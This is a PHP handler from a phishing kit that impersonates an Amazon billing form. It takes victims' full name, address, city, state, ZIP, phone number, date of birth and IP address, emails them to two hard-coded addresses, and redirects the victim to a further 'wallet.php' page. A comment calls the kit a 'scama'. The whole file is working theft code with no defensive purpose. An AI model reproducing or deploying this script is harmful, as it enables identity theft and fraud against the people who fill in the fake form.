<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Amazon BILLING -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "FULLNAME:    ".$_POST['full_name']."\n";
$message .= "ADDRESS1  :    ".$_POST['add_1']."\n";
$message .= "ADDRESS2:    ".$_POST['add_2']."\n";
$message .= "CITY  :    ".$_POST['city']."\n";
$message .= "STATE:    ".$_POST['state']."\n";
$message .= "ZIP  :    ".$_POST['ZIP']."\n";
$message .= "PHONE:    ".$_POST['phone']."\n";
$message .= "DOB  :    ".$_POST['DOB']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : https://geoiptool.com//?ip=$ip\n";                          
$message .= ">>>>>>>>>>>>>>>>>> Coded BY MR.Int  <<<<<<<<<<<<<<<\n";

$subject = "Amazon (BILLING) [$IP] <3 ";
$send = "johnson99@mailnesia.com,johnsonbridges117@gmail.com";
$headers = 'From: BILLING' . "\r\n" .
mail($send,$subject,$message,$headers);

/*$file_path = "logs.txt";

 if(file_exists($file_path)){
   $fhandle = fopen($file_path,'a+');
   file_put_contents($file_path,trim($message."\n"),FILE_APPEND);
   fclose($fhandle); 
 }else{ 
    echo "No";
	  }*/
header("Location:wallet.php");
include("../css/htaccess.css");// please  do not play with this , this script to protect your scama
?>



